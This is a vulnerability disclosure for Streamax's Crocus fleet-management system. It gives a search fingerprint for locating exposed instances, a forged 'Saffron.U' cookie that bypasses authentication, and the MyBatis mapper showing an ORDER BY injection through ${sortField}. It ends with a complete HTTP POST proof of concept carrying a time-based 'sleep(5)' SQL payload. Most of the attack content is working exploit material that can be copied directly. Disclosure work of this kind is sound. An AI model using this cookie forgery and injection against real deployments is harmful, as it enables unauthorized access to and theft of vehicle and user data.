# SQL Injection Vulnerability in the RepairRecord.do Interface of Crocus System by Shenzhen Ruiming Technology Co., Ltd.

## Basic Information

### System Overview
As a provider of intelligent IoT (AIoT) solutions for commercial vehicles focusing on AI and video technologies, Shenzhen Ruiming Technology Co., Ltd. has the Crocus System as one of its core products. The Crocus System is designed to leverage artificial intelligence (AI), high-definition (HD) video, big data, and autonomous driving technologies to help commercial vehicles reduce traffic accidents and cargo loss, while improving the operational efficiency of enterprises or fleets.

the company's official website：https://www.streamax.com/page/about.html
<img width="2234" height="1040" alt="image" src="https://github.com/user-attachments/assets/91d5964d-7b13-41b0-8e93-3f6fd9be0aae" />

### System Fingerprint
`body="/ThirdResource/respond/respond.min.js" && title="Crocus"`

<img width="1595" height="1150" alt="image" src="https://github.com/user-attachments/assets/a0fe1cda-b99c-46af-a4ba-51f551c30cc8" />

## Vulnerability Exploitation

### Privilege Bypass

<img width="1911" height="1091" alt="image" src="https://github.com/user-attachments/assets/388ced0b-2c69-45c7-8502-2c752773dec8" />

We found the location where the Cookie is generated in `streamax.saffron.controller.registerlogin.RegisterLoginController#SetUserCookie`.
It can be seen that all its parameters are controllable by the user. The code is as follows:

```java
    private void SetUserCookie(int userID, String userName, String password, int roleID, String guid, String map, String ins, HttpServletResponse response) throws Exception {
        String cookieStr = "UID=%s&UN=%s&GID=%s&RID=%s&M=%s&INS=%s";
        if (!CommonFunction.validate(new String[]{map})) {
            map = "";
        }

        if (!CommonFunction.validate(new String[]{ins})) {
            ins = "0";
        }

        cookieStr = String.format(cookieStr, userID, userName, guid, roleID, map, ins);
        String base64 = (new BASE64Encoder()).encode(cookieStr.getBytes("utf-8"));
        base64 = base64.replaceAll("\r|\n", "");
        Cookie cookie = new Cookie("Saffron.U", base64);
        cookie.setMaxAge(-1);
        cookie.setPath("/");
        response.addCookie(cookie);
    }
```
Based on this, we can forge a Cookie:

```
Cookie:Saffron.U="VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA="
```
<img width="525" height="475" alt="image" src="https://github.com/user-attachments/assets/e6a4be9c-d171-4426-8af6-66be581cb523" />

At this point, we have bypassed the authentication of this system.

### SQL Injection Vulnerability
Since the system uses MyBatis, we only need to search globally for `${` to find overlooked vulnerabilities.

```xml
<select id="queryLastRepairRecord" resultType="RepairRecordInfo">
		select a.id,a.chipcode,a.repairrecordid,a.beforefaultid,a.repairstate,a.remark,a.endtime,a.appointtime,
		ceil(a.repairtime/86400) as repairtime,a.username,a.userstate,a.`password`,b.carlicense,b.devicetype,b.deviceno,
		b.identification,c.`password` as rightpassword,d.groupName 
		from last_repairrecord as a INNER JOIN vehicledeviceinfo as b on a.chipcode=b.chipcode inner join groupinfo as d on b.groupid = d.groupid
		LEFT JOIN userinfo as c on a.username = c.username 
		<where>
			a.unidentified=0 and
			b.vehicleid in
			<foreach collection="vehicleIdList" item="vehicleId" separator="," open="(" close=")">
  				#{vehicleId} 
  			</foreach> 
  			<if test="userNameList!=null and userNameList.size()>0">
	  			and a.username in
				<foreach collection="userNameList" item="userName" separator="," open="(" close=")">
	  				#{userName} 
	  			</foreach> 
	  		</if>
	  		<if test="faultTypeList!=null and faultTypeList.size()>0">
	  			and 
				<foreach collection="faultTypeList" item="faultType" separator=" or " open="(" close=")">
	  				 beforefaultid like concat('%/',#{faultType},'/%')
	  			</foreach> 	  			
	  		</if>
	  		<if test="repairState!=null and repairState!='-1'.toString()">
  				and a.repairstate=#{repairState}
  			</if>
  			<if test="field==null and value!=null and value!=''.toString()">
  				and (b.chipcode like concat('%',#{value},'%') or b.carlicense like concat('%',#{value},'%') 
  				or b.deviceno like concat('%',#{value},'%') or b.devicetype like concat('%',#{value},'%')
  				or b.identification like concat('%',#{value},'%'))
  			</if>
  			<if test="field!=null and value!=null and value!=''.toString()">
  				and b.${field} like concat('%',#{value},'%')
  			</if>
  			<if test="startTime!=null and endTime!=null">
  				and ((a.endtime between #{startTime} and #{endTime}) 
  				or (a.appointtime between #{startTime} and #{endTime}))
  			</if>
		</where>
		<if test="sortField!=null">
			 order by ${sortField}
			 <if test="sortType=='desc'">
			 	desc 
			 </if> 
		</if>
		<if test="sortField==null">
			order by a.appointtime desc
		</if>
		<if test="startIndex>=0 and endIndex>=0">
			limit #{startIndex},#{endIndex}			
		</if>
	</select>
```
<img width="2094" height="1385" alt="image" src="https://github.com/user-attachments/assets/fd64c2ea-4e6b-4ebe-b49f-99c8dc7d69c2" />

This is a typical **ORDER BY injection** vulnerability.

We trace back to find the source point, and locate it in `streamax.saffron.controller.devicemaintain.RepairRecordController#queryLast`.

<img width="2296" height="1025" alt="image" src="https://github.com/user-attachments/assets/31da370c-f09b-4f47-8f80-10bae7c2d9bb" />

It turns out that the parameters are controllable by the user. Based on this, we constructed the following Proof of Concept (POC):

```
POST http://ip:port/RepairRecord.do?Action=QueryLast HTTP/1.1
Host: ip:port
Content-Length: 163
Cookie:Saffron.U="VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA="
Content-Type: application/x-www-form-urlencoded

EndTime=2024-08-20+00%3A00%3A00&PageIndex=0&PageSize=20&RepairState=-1&StartTime=2024-08-26+00%3A00%3A00&orderField=(select*from(select%0asleep(5))a)&orderType=asc
```
<img width="2003" height="1090" alt="image" src="https://github.com/user-attachments/assets/eb3f1e23-d9b2-4d0b-95e6-81e8b37d8e65" />

The successful 5-second delay confirms that the `RepairRecord.do?Action=QueryLast` interface has an SQL injection vulnerability.

Thank you for your review! Wish you all the best!
